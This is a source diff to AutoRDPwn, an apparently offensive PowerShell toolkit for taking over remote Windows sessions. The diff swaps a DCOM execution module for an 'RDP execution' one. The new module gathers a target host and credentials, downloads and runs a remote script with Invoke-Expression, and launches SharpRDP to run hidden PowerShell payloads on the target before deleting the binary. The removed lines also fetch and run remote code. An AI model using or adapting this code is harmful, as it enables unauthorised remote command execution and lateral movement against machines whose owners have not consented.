@@ -39,7 +39,7 @@ function Show-Menu { $Host.UI.RawUI.ForegroundColor = 'Gray'; if($nogui -like '-
      Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "4" -NoNewLine -ForegroundColor Green ; Write-Host "] - InvokeCommand / PSSession" -ForegroundColor Gray
      Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "5" -NoNewLine -ForegroundColor Green ; Write-Host "] - Windows Remote Assistance" -ForegroundColor Gray
      Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "6" -NoNewLine -ForegroundColor Green ; Write-Host "] - Session Hijacking (local)" -ForegroundColor Gray
-     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "7" -NoNewLine -ForegroundColor Green ; Write-Host "] - DCOM Passwordless Execution" -ForegroundColor Gray
+     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "7" -NoNewLine -ForegroundColor Green ; Write-Host "] - Remote Desktop Execution" -ForegroundColor Gray
      Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt1" -ForegroundColor Gray
      Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
      Write-Host }}
@@ -238,14 +238,26 @@ function Remove-Exclusions {
         Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
         $computer = $Host.UI.ReadLine() ; if(!$computer) { [Console]::SetCursorPosition(0,"$cursortop")
         $computer = 'localhost' ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host "localhost" }
-        Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue' }
-        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-DCOM.ps1')
-        Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe -windowstyle hidden $Pwn1" ; Write-Host
-        Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe -windowstyle hidden $Pwn2" ; Write-Host
-        Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe -windowstyle hidden $Pwn3" ; Write-Host
-        Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe -windowstyle hidden $Pwn4" ; Write-Host
-        Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe -windowstyle hidden $Pwn5" }
-
+        Write-Host ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
+        $user = $Host.UI.ReadLine() ; if(!$user) { [Console]::SetCursorPosition(0,"$cursortop")
+        Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; Write-Host $currentuser }
+        Write-Host ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
+        $password = $Host.UI.ReadLineAsSecureString() ; $PlainTextPassword = ConvertFrom-SecureToPlain $password
+        if(!$PlainTextPassword) { [Console]::SetCursorPosition(0,"$cursortop") ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; Write-Host "********" } 
+        $Host.UI.RawUI.ForegroundColor = 'Blue' }
+        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-SharpRDP.ps1')
+        if(!$user) { .\SharpRDP.exe computername=$computer command="powershell.exe -windowstyle hidden $Pwn1" ; Write-Host
+        .\SharpRDP.exe computername=$computer command="powershell.exe -windowstyle hidden $Pwn2" ; Write-Host
+        .\SharpRDP.exe computername=$computer command="powershell.exe -windowstyle hidden $Pwn3" ; Write-Host
+        .\SharpRDP.exe computername=$computer command="powershell.exe -windowstyle hidden $Pwn4" ; Write-Host
+        .\SharpRDP.exe computername=$computer command="powershell.exe -windowstyle hidden $Pwn5" ; Write-Host }
+        if($user) { .\SharpRDP.exe computername=$computer command="powershell.exe -windowstyle hidden $Pwn1" ; Write-Host
+        .\SharpRDP.exe computername=$computer username=$user password=$password command="powershell.exe -windowstyle hidden $Pwn2" ; Write-Host
+        .\SharpRDP.exe computername=$computer username=$user password=$password command="powershell.exe -windowstyle hidden $Pwn3" ; Write-Host
+        .\SharpRDP.exe computername=$computer username=$user password=$password command="powershell.exe -windowstyle hidden $Pwn4" ; Write-Host
+        .\SharpRDP.exe computername=$computer username=$user password=$password command="powershell.exe -windowstyle hidden $Pwn5" ; Write-Host }
+        del .\SharpRDP.exe }
+        
         'M' { Show-Banner ; Show-Modules
         $Random = New-Object System.Random ; $txt8 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
         $Host.UI.RawUI.ForegroundColor = 'Green' ; $module = $Host.UI.ReadLine() ; Write-Host
